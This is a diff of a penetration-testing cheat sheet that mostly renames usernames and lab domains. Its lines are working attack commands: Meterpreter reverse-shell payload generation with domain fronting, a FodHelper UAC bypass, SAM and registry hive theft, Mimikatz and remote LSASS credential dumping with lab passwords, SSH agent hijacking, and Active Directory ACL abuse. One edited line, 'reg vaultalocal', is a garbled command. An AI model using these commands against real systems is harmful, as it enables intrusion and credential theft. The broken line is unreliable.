@@ -450,7 +450,7 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.83 LHOST=443 
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.83 LPORT=443 EXITFUNC=thread -f msi-nouac -o meterp64-nouac.msi 
 
 # domain fronting
-msfvenom -p windows/x64/meterpreter_reverse_https HttpHostHeader=cdn123.offseccdn.com LHOST=good.com LPORT=443 -f exe > https-df.exe
+msfvenom -p windows/x64/meterpreter_reverse_https HttpHostHeader=cdn123.vaultcdn.com LHOST=good.com LPORT=443 -f exe > https-df.exe
 ```
 
 #### Linux Payload Generation
@@ -1805,11 +1805,11 @@ beacon> execute-assembly /tools/SeatBelt.exe -group=system
 #### UAC Bypass FodHelper Technique
 
 ```
-PS C:\Users\Offsec> New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe –Force
+PS C:\Users\tonys> New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe –Force
 
-PS C:\Users\Offsec> New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
+PS C:\Users\tonys> New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
 
-PS C:\Users\Offsec> C:\Windows\System32\fodhelper.exe
+PS C:\Users\tonys> C:\Windows\System32\fodhelper.exe
 ```
 
 ### Privilege Escalation Manual Checks
@@ -1951,12 +1951,12 @@ Manual
 ```
 # shadowcopy
 cmd> wmic shadowcopy call create Volume='C:\'
-cmd> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam
-cmd> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\security C:\users\offsec.corp1\Downloads\security
+cmd> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\vault.local\Downloads\sam
+cmd> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\security C:\users\vault.local\Downloads\security
 
-# registry
-reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
-reg save HKLM\system C:\users\offsec.corp1\Downloads\system
+# local
+reg vaultalocal HKLM\sam C:\users\vault.local\Downloads\sam
+reg save HKLM\system C:\users\vault.local\Downloads\system
 ```
 
 Secretsdump parse
@@ -2044,24 +2044,11 @@ beacon> execute-assembly c:\tools\SafetyKatz.exe
 ###### Mimikatz Logon Passwords 
 
 ```
+# set privs
 mimikatz # privilege::debug
-Privilege '20' OK
 
+# run
 mimikatz # sekurlsa::logonpasswords
-
-Authentication Id : 0 ; 59564789 (00000000:038ce2f5)
-Session           : RemoteInteractive from 3
-User Name         : offsec
-Domain            : CORP1
-Logon Server      : DC01
-Logon Time        : 4/2/2021 6:15:10 AM
-SID               : S-1-5-21-3736398112-481754977-1285760525-1106
-        msv :
-         [00000003] Primary
-         * Username : offsec
-         * Domain   : CORP1
-         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
-[...]
 ```
 
 ###### Covenant Logon Passwords
@@ -2073,7 +2060,9 @@ SID               : S-1-5-21-3736398112-481754977-1285760525-1106
 ###### Remote LSASS
 
 ```
-SharpSecDump.exe -target=sccm.vault.local -u=sccmsvc -p=salt&Vinegar! -d=vault.local
+SharpMapExec.exe kerberos winrm /user:sqlsvc /password:Ch3xmix! /domain:vault.local /computername:sql-1.vault.local /m:comsvcs
+
+SharpMapExec.exe ntlm winrm /user:sqlsvc /password:Ch3xmix! /domain:vault.local /computername:sql-1.vault.local /m:comsvcs
 ```
 
 ###### Disable LSA protection with Mimikatz
@@ -2771,7 +2760,7 @@ Host *
 Connect
 
 ```
-ssh -S /home/offsec/.ssh/controlmaster/offsec@192.168.83.45\:22 offsec@192.168.83.45
+ssh -S /home/vault/.ssh/controlmaster/vault@192.168.83.45\:22 vault@192.168.83.45
 ```
 
 #### SSH-Agent Pivot
@@ -2782,7 +2771,7 @@ Grab the connection's PID with `ps` or `ptrace`
 # sets attacker's current privileged user’s SSH_AUTH_SOCK
 SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh-add -l
 
-SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh offsec@linuxvictim
+SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh vault@linuxvictim
 ```
 
 ### Linux Ansible
@@ -3059,7 +3048,7 @@ EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT
 . .\PowerView.ps1
 
 # enum ACL
-Get-ObjectAcl -Identity offsec
+Get-ObjectAcl -Identity adm
 
 # sid convert
 ConvertFrom-SID <sid>
@@ -3071,7 +3060,7 @@ Get-DomainGPOLocalGroup -ResolveMembersToSIDs -domain vault.local
 Invoke-Sharphound3 -Command "-c GPOLocalGroup,all -d vault.local"
 
 # enum all ACLs
-Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
+Get-ObjectAcl -Identity adm -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
 
 # enumerate specific object ACL
 Get-ObjectAcl -Identity testservice2 -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
@@ -3097,14 +3086,14 @@ Abuse GernicAll ACL over Group object
 net user testservice1 h4x /domain
 
 # add user to group
-net group testgroup offsec /add /domain
+net group testgroup adm /add /domain
 ```
 
 #### WriteDacl
 
 ```
 # add GenericAll using WriteDACL
-Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All
+Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity adm -Rights All
 ```
 
 #### GenericWrite
